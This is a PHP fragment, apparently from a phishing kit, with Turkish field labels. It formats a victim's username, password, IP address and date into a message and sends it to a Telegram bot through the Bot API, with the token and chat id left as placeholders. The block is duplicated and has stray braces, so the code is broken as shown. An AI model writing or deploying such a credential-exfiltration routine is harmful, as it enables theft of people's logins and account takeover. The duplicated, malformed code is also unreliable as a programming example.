<?php

	$token='noekle';
    $data = [
        'text' => '
      Kullanıcı Adı : '.$username.'
      Şifre : '.$password.'
      İp : '.$ip.'
      Tarih : '.$date.'
      ',
      'chat_id' =>idekle
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}




	$token='noekle';

    $data = [

        'text' => '
      Kullanıcı Adı : '.$username.'
      Şifre : '.$password.'
      İp : '.$ip.'
      Tarih : '.$date.'
      ',
      'chat_id' =>idekle
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}


?>